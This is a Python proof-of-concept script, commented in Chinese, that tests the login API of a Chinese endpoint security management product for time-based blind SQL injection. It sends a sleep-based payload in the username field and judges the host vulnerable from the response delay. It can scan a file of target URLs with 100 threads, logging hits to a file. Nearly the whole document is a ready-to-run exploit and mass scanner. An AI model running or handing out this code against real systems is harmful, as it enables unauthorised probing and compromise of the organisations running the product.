# 辰信景云终端安全管理系统 login存在 SQL注入漏洞
import argparse,requests,sys,time   #调用模块
from multiprocessing.dummy import Pool      #调用模块
requests.packages.urllib3.disable_warnings()       #证书错误抑制

# 定义指纹
def banner():   
    banner ='''

#                 #    #   ___                       
#=ooO=========Ooo=#    #  <_*_>            ,,,,,     
#  \\  (o o)  //  #    #  (o o)           /(o o)\    
--------(_)------------8---(_)--Ooo----ooO--(_)--Ooo-
                            @author:qbt
                            @version:0.0.1
'''
    print(banner)
# 定义poc
def poc(target):
    url = target+'/api/user/login'
    headers = {
        'Cookie': 'vsecureSessionID=e09610a7372a6e99845b989136fce473',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': "Windows",
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '102'
    }
    data = {
        'captcha':'','password':'21232f297a57a5a743894a0e4a801fc3','username':"admin'and(select*from(select+sleep(3))a)='"
    }
    try:
# 发送一个post请求
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
#响应时间
        res_time = res.elapsed.total_seconds()
        # print(res_time) 测试响应时间
#暂停3秒等待响应包返回
        time.sleep(3)
#判断响应时间
        if  3 < res_time < 6:
            print("[+]"+ target + "辰信景云终端安全管理系统 login存在 SQL注入漏洞")
            with open('seccess.txt','a',encoding='utf-8') as f:
                f.write('[+]'+target+'辰信景云终端安全管理系统 login存在 SQL注入漏洞\n')
                return True
        else:
            print("[-]"+ target + "不存在漏洞")
            return False
    except:
        print('抛出一个错误')

# 定义主函数
def main():
    banner() #调用指纹函数
#实例化
    parser = argparse.ArgumentParser(description='辰信景云终端安全管理系统 login存在 SQL注入漏洞')
#定义参数
    parser.add_argument('-u','-url',dest='url',help='请输入url',type=str)
    parser.add_argument('-f','--file',dest='file',help='url.txt',type=str)
#处理命令行参数
    args = parser.parse_args()
#判断是单个url还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
#定义一个空列表
        url_list = []
#打开文件并以单行读取并输入到定义的列表中
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
#线程池为100
        mp = Pool(100)
#将列表的参数，输入到poc
        mp.map(poc, url_list)
#关闭多线程
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


#调用主函数，有防止被误操作导致直接执行的能力
if __name__ == '__main__':
    main()